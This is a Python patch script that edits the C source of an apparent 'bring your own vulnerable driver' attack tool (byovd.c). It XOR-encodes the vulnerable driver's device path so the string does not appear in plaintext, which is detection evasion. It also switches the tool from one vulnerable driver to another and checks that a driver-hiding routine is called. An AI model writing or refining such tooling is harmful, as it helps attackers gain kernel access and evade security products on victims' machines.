import re

with open('byovd.c', encoding='utf-8', errors='replace') as f:
    txt = f.read()

# ── 1. Replace TryOpenViaNtPath body ──────────────────────────────────────
# Find it by the unique closing pattern
old_try_start = 'TryOpenViaNtPath(void) {'
old_try_end   = 'BYOVD_LogFmt("TryOpenViaNtPath: NtOpenFile ns=0x%08X h=%p", ns, h);'
idx_s = txt.find(old_try_start)
idx_e = txt.find(old_try_end)
if idx_s >= 0 and idx_e > idx_s:
    # Find the closing brace after old_try_end
    brace_pos = txt.find('\n}', idx_e)
    old_try = txt[idx_s : brace_pos+2]
    new_try = r'''TryOpenViaNtPath(void) {
    /* \\Device\\CtiIo XOR-encoded (key=0x31) to avoid plaintext in .rdata */
    static const UCHAR enc[] = {0x6D,0x75,0x54,0x47,0x58,0x52,0x54,0x6D,0x72,0x45,0x58,0x78,0x5E};
    WCHAR ntPath[14]; int i;
    for(i=0;i<13;i++) ntPath[i]=(WCHAR)(enc[i]^0x31); ntPath[13]=0;
    BYOVD_US us = { (USHORT)(13*2), (USHORT)(14*2), ntPath };
    struct { ULONG Len; HANDLE Root; BYOVD_US* Name; ULONG Attr; PVOID SD; PVOID SQoS; }
        oa = { sizeof(oa), NULL, &us, 0x40, NULL, NULL };
    BYOVD_IOSB iosb = {0};
    HANDLE h = NULL;
    NTSTATUS ns = SysNtOpenFile(&h,
        GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE,
        (POBJECT_ATTRIBUTES)&oa, (PIO_STATUS_BLOCK)&iosb,
        FILE_SHARE_READ|FILE_SHARE_WRITE, 0x20);
    BYOVD_LogFmt("TryOpenViaNtPath(CtiIo): ns=0x%08X h=%p", ns, h);
    if (ns < 0 || !h || h == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;
    return h;
}'''
    txt = txt.replace(old_try, new_try, 1)
    print('1x replaced: TryOpenViaNtPath')
else:
    print(f'WARNING: TryOpenViaNtPath: idx_s={idx_s} idx_e={idx_e}')

# ── 2. Replace UnloadDriver body ─────────────────────────────────────────
idx_u = txt.find('static void UnloadDriver(void){')
if idx_u < 0:
    idx_u = txt.find('static void UnloadDriver(void) {')
if idx_u >= 0:
    # Find the closing brace by counting braces
    depth = 0; pos = idx_u
    while pos < len(txt):
        if txt[pos] == '{': depth += 1
        elif txt[pos] == '}':
            depth -= 1
            if depth == 0: break
        pos += 1
    old_unload = txt[idx_u : pos+1]
    new_unload = '''static void UnloadDriver(void){
    if(s_hDev!=INVALID_HANDLE_VALUE){ SysNtClose(s_hDev); s_hDev=INVALID_HANDLE_VALUE; }
    if(!s_svcName[0]) return;
    tRtlIUS RtlIUS=(tRtlIUS)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"RtlInitUnicodeString");
    if(RtlIUS){
        WCHAR ntSvc[256]; wsprintfW(ntSvc,L"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\\%s",s_svcName);
        BYOVD_US us; RtlIUS(&us,ntSvc);
        SysNtUnloadDriver(&us);
    }
    BYOVD_Log("UnloadDriver: done.");
}'''
    txt = txt.replace(old_unload, new_unload, 1)
    print('1x replaced: UnloadDriver')
else:
    print('WARNING: UnloadDriver not found')

# ── 3. Fix remaining ASR references (AsrDrv103 string in TryOpenViaNtPath)─
remaining_asr = txt.count('AsrDrv103') + txt.count('ASRDRV') + txt.count('AsrPhys')
print(f'Remaining ASR refs before final fix: {remaining_asr}')
txt = txt.replace('AsrDrv103', 'CtiIo')
txt = txt.replace('ASRDRV', 'CTIIO')
txt = txt.replace('AsrPhys', 'CtiPhys')
remaining_asr2 = txt.count('AsrDrv103') + txt.count('ASRDRV') + txt.count('AsrPhys')
print(f'Remaining ASR refs after fix: {remaining_asr2}')

# ── 4. Verify HideByovdDriver call was inserted ───────────────────────────
if 'HideByovdDriver();' in txt:
    print('HideByovdDriver() call present in file')
else:
    print('WARNING: HideByovdDriver() call NOT found -- searching BYOVD_Init...')

with open('byovd.c', 'w', encoding='utf-8') as f:
    f.write(txt)
print('DONE')
